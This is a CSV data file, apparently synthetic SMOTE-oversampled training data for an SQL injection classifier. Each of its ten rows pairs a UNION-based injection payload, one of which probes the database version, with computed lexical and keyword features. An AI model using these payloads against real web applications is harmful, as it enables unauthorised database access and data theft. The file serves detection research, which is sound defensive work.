id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000126,0.4244990324652221,74.96812445405189,21.703187554594813,3.770495012628039,14.0,34.374499563241514,14.0,12.593624890810379,0.18740620895041898,0.45731436077637677,0.18740620895041896,0.16787322132278532,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,6.5936248908103785,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000002,attack,union,"1'+  (  select 'pgje' where 4658  =  4658 union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000168,1.179127728483011,106.19982165723457,27.066607219078193,3.8684608533841947,66.51095258420851,9.0,15.0,15.688869073026064,0.625862948378857,0.08488088120044854,0.14146813533408087,0.14778803508661356,3.0,0.0,0.6222618539478724,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.377738146052128,2.6222618539478724,1.0,0.0,0.3111309269739362,0.6888690730260636,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000003,attack,union,"1' where 7688  =  7688 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,0.42393021011694193,86.48903105648203,22.0,3.5998844619054275,55.0,9.0,10.489031056482034,12.0,0.6360598568337841,0.1040825220273465,0.12108092510240757,0.13877669603646195,0.8777422358794913,0.0,2.0,0.0,0.0,1.0,0.0,0.1222577641205087,0.0,0.0,8.0,3.0,0.8777422358794913,0.0,1.0,0.0,0.0,1.0,0.1222577641205087,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000004,attack,union,"-9240' union all select 6538,6538,6538#",nearest_attack_euclidean,R000234,0.20247411020480952,39.0,22.37120856172122,4.2645064120492115,14.0,16.0,4.0,5.0,0.358974358974359,0.41025641025641024,0.10256410256410255,0.1282051282051282,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000005,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000129,0.1052721818311158,67.42410295564703,28.939413863478997,4.1412420865789406,25.0,20.0,16.363516819126023,6.060586136521003,0.37099585036482946,0.2967966802918635,0.2423497336811398,0.08985773566216723,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0605861365210039,0.0,0.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000006,attack,union,"-8735'   )    )    union all select 3262,3262,3262--",nearest_attack_euclidean,R000208,0.4506419846173335,55.23269196257079,21.0,3.8196745967023085,14.0,18.58615357005663,14.0,8.646538392514158,0.2551930249764296,0.3333613257573859,0.2551930249764296,0.15625262428975492,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.6465383925141577,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000007,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R000099,0.33050891317113884,69.89843751526998,21.0,3.7642527041856253,14.0,27.159375006107986,17.15937500610799,11.579687503053995,0.20103536621555118,0.3885122647876828,0.24491557463371766,0.16553679436304836,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.7898437515269974,0.0,0.0,4.789843751526997,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000008,attack,union,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",nearest_attack_euclidean,R000134,0.4473947362143857,63.51546043309407,21.0,3.6292051124835933,14.0,35.61236834647525,4.0,9.903092086618814,0.22560885949029372,0.5550532382676812,0.06445967414008391,0.15487822810194124,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.903092086618814,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000009,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000032,0.36298628095593727,76.89926886135925,26.449634430679623,3.906374866989068,40.0,3.0,23.449634430679623,10.449634430679623,0.5202478484388714,0.03901858863291535,0.3049070568354232,0.13582650609278996,0.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,2.0,0.0,0.0,1.0,4.449634430679624,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000010,attack,union,"1   )    )    union all select null,null,null--",nearest_attack_euclidean,R000138,0.9300142683726361,50.45847471246719,15.314406792042472,3.2373275327424076,28.515254336339773,1.0,14.0,6.943220376127416,0.5635717576242929,0.020007896290364202,0.28011054806509883,0.1363097980202441,0.31440679204247174,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.6288135840849436,2.0,0.31440679204247185,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
